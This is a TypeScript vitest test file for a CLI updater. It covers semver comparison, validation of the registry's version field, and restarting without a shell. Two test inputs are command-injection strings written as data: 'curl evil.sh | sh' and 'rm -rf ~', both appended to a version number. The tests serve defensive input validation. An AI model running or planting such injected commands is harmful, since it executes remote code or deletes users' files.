import { describe, it, expect, vi, afterEach } from "vitest";
import { fetchLatestVersion, isNewer } from "../src/version.js";
import { spawnPostUpdateRestart } from "../src/cli/update.js";

afterEach(() => vi.unstubAllGlobals());

const registryReturns = (body: unknown): void => {
  vi.stubGlobal("fetch", vi.fn(async () => ({
    ok: true,
    json: async () => body,
  })));
};

describe("isNewer — semver precedence", () => {
  it.each([
    ["a higher patch", "0.9.2", "0.9.1", true],
    ["the same release", "0.9.2", "0.9.2", false],
    ["an older release", "0.9.1", "0.9.2", false],
    ["minor outranks patch", "0.10.0", "0.9.9", true],
    // Someone running an RC used to never hear about the final release.
    ["a release over its own prerelease", "0.9.2", "0.9.2-rc.1", true],
    ["a later release over a prerelease", "0.9.3", "0.9.2-rc.1", true],
    ["a prerelease is below its release", "0.9.2-rc.1", "0.9.2", false],
    ["a prerelease of a later version", "1.0.0-rc.1", "0.9.2", true],
    ["numeric identifiers compare as numbers", "1.0.0-rc.10", "1.0.0-rc.2", true],
    ["numeric identifiers rank below alphanumeric", "1.0.0-alpha", "1.0.0-1", true],
    ["alphanumeric identifiers compare in ASCII order", "1.0.0-beta", "1.0.0-alpha", true],
    ["a longer identifier list ranks higher", "1.0.0-alpha.1", "1.0.0-alpha", true],
    ["the same prerelease", "1.0.0-rc.2", "1.0.0-rc.2", false],
    ["build metadata carries no precedence", "1.0.0+build.2", "1.0.0+build.1", false],
    ["an unparseable latest is never newer", "garbage", "0.9.2", false],
    ["an unparseable current is never older", "0.9.2", "test", false],
    ["a leading zero in the core is not a version", "1.02.3", "1.0.0", false],
    ["a leading zero in a numeric prerelease identifier is not a version", "1.0.0-01", "0.9.0", false],
    ["an empty prerelease is not a version", "1.0.0-", "0.9.0", false],
    ["an empty prerelease identifier is not a version", "1.0.0-a..b", "0.9.0", false],
    ["empty build metadata is not a version", "1.0.0+", "0.9.0", false],
    ["a v prefix is not a version", "v1.0.0", "0.9.0", false],
    ["numeric identifiers past 2^53 compare exactly", "1.0.0-9007199254740993", "1.0.0-9007199254740992", true],
    ["core parts past 2^53 compare exactly", "9007199254740993.0.0", "9007199254740992.0.0", true],
    ["a prerelease with build metadata compares by its prerelease", "1.0.0-rc.2+build.1", "1.0.0-rc.1", true],
  ])("%s: isNewer(%s, %s) is %s", (_label, latest, current, expected) => {
    expect(isNewer(latest, current)).toBe(expected);
  });
});

describe("fetchLatestVersion — registry response is remote input", () => {
  // A malformed value used to be returned verbatim and interpolated into a
  // command line that ran through `sh -c`.
  it.each([
    ["accepts a plain semver", { version: "0.9.1" }, "0.9.1"],
    ["accepts a prerelease tail", { version: "1.0.0-rc.2" }, "1.0.0-rc.2"],
    ["accepts a prerelease with build metadata", { version: "1.2.3-rc.1+build.5" }, "1.2.3-rc.1+build.5"],
    ["rejects a leading zero", { version: "1.02.3" }, null],
    ["rejects an empty prerelease identifier", { version: "1.0.0-a..b" }, null],
    ["rejects an absurdly long version", { version: `1.0.0-${"a".repeat(300)}` }, null],
    ["rejects a version carrying shell metacharacters", { version: "1.0.0; curl evil.sh | sh" }, null],
    ["rejects a version with whitespace", { version: "1.0.0 && rm -rf ~" }, null],
    ["rejects a non-string version", { version: 12 }, null],
    ["returns null when the field is absent", {}, null],
  ])("%s", async (_label, body, expected) => {
    registryReturns(body);
    expect(await fetchLatestVersion()).toBe(expected);
  });

  it("returns null for a registry error status, and when the request itself fails", async () => {
    vi.stubGlobal("fetch", vi.fn(async () => ({ ok: false, json: async () => ({ version: "9.9.9" }) })));
    expect(await fetchLatestVersion()).toBeNull();
    vi.stubGlobal("fetch", vi.fn(async () => { throw new Error("getaddrinfo ENOTFOUND"); }));
    expect(await fetchLatestVersion()).toBeNull();
  });
});

describe("spawnPostUpdateRestart", () => {
  it("passes the reason as a single argv entry", () => {
    const spawnFn = vi.fn(() => ({ on: vi.fn() }));
    spawnPostUpdateRestart("0.8.14", "0.8.15", spawnFn as never);
    const [, args] = spawnFn.mock.calls[0] as unknown as [string, string[], object];
    expect(args).toContain("--reason");
    expect(args[args.indexOf("--reason") + 1]).toBe("Updated from v0.8.14 to v0.8.15");
    // The whole point: the reason must not have been split into positionals.
    expect(args[args.length - 1]).toBe("Updated from v0.8.14 to v0.8.15");
  });

  it("does not route the command line through a shell", () => {
    const spawnFn = vi.fn(() => ({ on: vi.fn() }));
    spawnPostUpdateRestart("0.8.14", "0.8.15", spawnFn as never);
    const [, , options] = spawnFn.mock.calls[0] as unknown as [string, string[], { shell?: boolean }];
    expect(options.shell).toBeUndefined();
  });
});
